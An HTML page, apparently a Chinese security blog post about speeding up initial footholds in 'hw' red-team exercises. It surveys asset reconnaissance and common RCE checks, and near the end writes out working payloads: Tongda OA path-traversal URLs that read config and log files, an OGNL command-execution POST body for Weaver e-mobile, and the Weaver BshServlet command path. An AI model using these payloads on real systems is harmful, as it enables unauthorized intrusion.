@@ -1,0 +1,158 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>关于hw打点的思考 | 藏青&#39;s BLOG</title>
+
+  
+  <meta name="author" content="藏青">
+  
+
+  
+  <meta name="description" content="知行合一">
+  
+
+  
+  <meta name="keywords" content="渗透 内网 代码审计">
+  
+
+  <meta id="viewport" name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black">
+
+  <meta property="og:title" content="关于hw打点的思考"/>
+
+  <meta property="og:site_name" content="藏青&#39;s BLOG"/>
+
+  
+  <meta property="og:image" content="/favicon.ico"/>
+  
+
+  <link href="/favicon.ico" rel="icon">
+  <link rel="alternate" href="/atom.xml" title="藏青&#39;s BLOG" type="application/atom+xml">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body>
+<div class="blog">
+  <div class="content">
+
+    <header>
+  <div class="site-branding">
+    <h1 class="site-title">
+      <a href="/">藏青&#39;s BLOG</a>
+    </h1>
+    <p class="site-description"></p>
+  </div>
+  <nav class="site-navigation">
+    <ul>
+      
+        <li><a href="/">Home</a></li>
+      
+        <li><a href="/archives">Archives</a></li>
+      
+        <li><a href="/categories">Categories</a></li>
+      
+        <li><a href="/links">Links</a></li>
+      
+    </ul>
+  </nav>
+</header>
+
+    <main class="site-main posts-loop">
+    <article>
+
+  
+    
+    <h3 class="article-title"><span>关于hw打点的思考</span></h3>
+    
+  
+
+  <div class="article-top-meta">
+    <span class="posted-on">
+      <a href="/2020/08/21/关于hw打点的思考/" rel="bookmark">
+        <time class="entry-date published" datetime="2020-08-21T01:26:01.000Z">
+          2020-08-21
+        </time>
+      </a>
+    </span>
+  </div>
+
+
+  
+
+  <div class="article-content">
+    <div class="entry">
+      
+        <p>​            一年一度的hw活动又开始了，关于hw的比拼，各个公司都十分看重，都希望能在这次比赛中拿到一个比较好的成绩，针对于hw这种形式，还是比较考验一个人或者一个团队的梭哈能力，有些红队人员虽然内网非常强，姿势也非常骚，可是打点可能不是很快，对于这种比赛来讲，就是手慢则无。反而一把梭哈，速度快还能拿到比较不错的成绩。下面我根据我的不成熟的经验来分析一下，如何提升速度。</p>
+<span id="more"></span>
+
+<p>​            首先是信息搜集的能力，我们可以想一下，如果一个攻击队，信息搜集非常慢，半天才找到不多的资产，然后再去做一些常规的rce的测试，和那些有自动化工具的队伍比起来就慢了一大截，因此hw还是比较考验队伍快速搜集资产的能力，否则即使0day在手，找不到对应的平台也没用啊。关于自动化信息搜集的工具，其实可以借助一些网络资产搜集引擎，因为hw的很多蓝方精神都是高度集中，你扫个端口肯定就被拌掉了，因此最好在搜集的时候能不直接和这些目标接触并且能拿到我们想要的信息。这里我提供一个思路，就是调用各种接口搜集资产信息，找到以后再去验证存活，再获取一些指纹信息，比如网站的架构，什么cms，用了什么中间件，这些信息对我们打点来说都是非常重要的。</p>
+<p>​            然后再来谈谈挖洞，其实hw这些目标都挺大的，也就是说资产比较多，有新架构有老架构，用这种框架中间件的也非常多。那当我们拿到这么多资产后，我们该如何快速打点呢？</p>
+<p>​            我认为首先应该去找各种影响比较大的rce去检测</p>
+<p><strong>java站</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">weblogic rce  根据404报错的那个标题即可识别是否是weblogic</span><br><span class="line">struts rce		有人写了识别工具，也可以根据后缀比如.do，.action</span><br><span class="line">spring boot rce 根据404或者500的报错页面进行识别，找env文件</span><br><span class="line">shior rce       找java的登录口，看返回结果是否有remeberme 之类的字段</span><br></pre></td></tr></table></figure>
+
+<p><strong>php站</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">thinkphp rce thinkphp可以根据路由来进行识别</span><br><span class="line">解析漏洞   1.jgp/1.php</span><br></pre></td></tr></table></figure>
+
+<p><strong>asp/aspx</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ueditor任意文件上传  扫ueditor的目录</span><br></pre></td></tr></table></figure>
+
+<p>​        当没有这些影响比较大的漏洞时，我们再去考虑一些cms或者一些oa这种我们知道某些版本有漏洞的站，最好还是那种已知有rce的cms。这个其实也比较依赖于大家的经验和总结能力，毕竟要跟一些爆发的漏洞也挺费精力的。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">通达：</span><br><span class="line">漏洞指纹：/ispirit/interface/gateway.php 文件包含漏洞</span><br><span class="line">ispirit/interface/gateway.php?json=&#123;&quot;url&quot;:&quot;/general/../../mysql5/my.ini&quot;&#125;</span><br><span class="line">ispirit/interface/gateway.php?json=&#123;&#125;&amp;url=/general/../../nginx/logs/oa.access.log</span><br><span class="line">泛微：</span><br><span class="line">e-mobile常在89端口 rce</span><br><span class="line">访问login.do post如下内容：</span><br><span class="line">message=(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#w=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;).getWriter()).(#w.print(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(#parameters.cmd[0]).getInputStream()))).(#w.close())&amp;cmd=whoami</span><br><span class="line">泛微rce /weaver/bsh.servlet.BshServlet 直接访问即可执行命令</span><br></pre></td></tr></table></figure>
+
+<p>​        当这些可以直接可以利用的rce无法利用时，我们就要去找一些cms可以通过组合可以getshell的站。这些如果还没有，那我们就需要去看那些他们自己开发的网站了。去找找后台，找找上传，找找注入等等。</p>
+
+      
+    </div>
+
+  </div>
+
+  <div class="article-footer">
+    <div class="article-meta pull-left">
+
+    
+      
+
+    <span class="post-categories">
+      <i class="icon-categories"></i>
+        <a href="/categories/随笔/">随笔</a>
+    </span>
+    
+
+    
+
+    </div>
+
+    
+  </div>
+</article>
+
+  
+
+
+
+
+
+
+    </main>
+
+    <footer class="site-footer">
+  <p class="site-info">
+    Proudly powered by <a href="https://hexo.io/" target="_blank">Hexo</a> and
+    Theme by <a href="https://github.com/CodeDaraW/Hacker" target="_blank">Hacker</a>
+    </br>
+    
+    &copy; 2021 藏青
+    
+  </p>
+</footer>
+    
+    
+  </div>
+</div>
+</body>
+</html>
